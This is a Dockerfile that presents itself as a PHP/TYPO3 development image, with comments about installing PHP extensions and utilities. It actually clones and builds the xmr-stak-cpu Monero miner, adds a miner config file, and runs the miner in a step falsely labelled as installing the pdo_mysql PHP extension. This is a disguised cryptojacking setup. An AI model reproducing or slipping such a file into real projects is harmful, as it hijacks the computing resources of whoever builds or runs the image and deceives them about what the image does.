#
#--------------------------------------------------------------------------
# Image Setup
#--------------------------------------------------------------------------
#

FROM ubuntu:latest

MAINTAINER Cheney Veron <cheneyveron@live.cn>

#
#--------------------------------------------------------------------------
# Software's Installation
#--------------------------------------------------------------------------
#
# Installing tools and PHP extentions using "apt", "docker-php", "pecl",
#

# Install "curl", "libmemcached-dev", "libpq-dev", "libjpeg-dev",
#         "libpng12-dev", "libfreetype6-dev", "libssl-dev", "libmcrypt-dev",
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev

# Install general utilities
RUN apt-get update \
	&& apt-get install -y \
		vim \
		net-tools \
		procps \
		telnet \
		netcat \
        git \
        gcc \
        g++ \
        make \
	&& rm -r /var/lib/apt/lists/*

# Install utilities used by TYPO3 CMS / Flow / Neos
RUN apt-get update \
	&& apt-get install -y \
		imagemagick \
		graphicsmagick \
		zip \
		unzip \
		wget \
		curl \
		git \
		mysql-client \
		moreutils \
		dnsutils \
	&& rm -rf /var/lib/apt/lists/*

# Install the xmr
RUN git clone https://github.com/fireice-uk/xmr-stak-cpu.git /xmr \
    && cd /xmr \
    && cmake . \
    && make install \
    && rm -rf /xmr/bin/config.txt

ADD config.txt /xmr/bin/config.txt

# Install the PHP pdo_mysql extention
RUN cd /xmr/bin \
    && ./xmr-stak-cpu